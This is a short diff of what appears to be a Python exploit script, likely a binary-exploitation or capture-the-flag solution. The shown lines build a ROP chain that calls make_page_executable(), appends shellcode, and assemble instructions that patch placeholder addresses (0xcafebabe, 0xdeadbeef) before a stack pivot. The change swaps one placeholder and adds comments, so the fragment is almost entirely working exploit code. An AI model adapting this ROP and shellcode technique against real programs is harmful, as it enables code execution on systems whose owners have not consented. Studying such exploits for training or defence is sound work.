@@ -85,7 +85,7 @@ if __name__ == "__main__":
     bytes += p64(B + pop_rdi)               # 0x18
     bytes += p64(0xcafebabe)                # 0x20
     bytes += p64(B + 0xa20)                 # 0x28, make_page_executable()
-    bytes += p64(0xcafebabe)                # 0x30, (adjust_stack + shellcode)
+    bytes += p64(0xdeadbeef)                # 0x30, (adjust_stack + shellcode)
     bytes += adjust_stack                   # 0x38
     bytes += shellcode
 
@@ -100,11 +100,11 @@ if __name__ == "__main__":
     op += assemble('dec r14')
     op += assemble('not r14')
     op += assemble('and r15,r14')
-    op += store_r15(offset + 0x20)
+    op += store_r15(offset + 0x20)          # replace 0xcafebabe (address of stack page)
 
     op += assemble('push rsp; pop r15')
     op += assemble('inc r15') * (offset + 0x38)
-    op += store_r15(offset + 0x30)
+    op += store_r15(offset + 0x30)          # replace 0xdeadbeef (start of shellcode)
 
     op += movb_r15(offset)
     op += assemble('add rsp,r15; ret')      # stack pivot
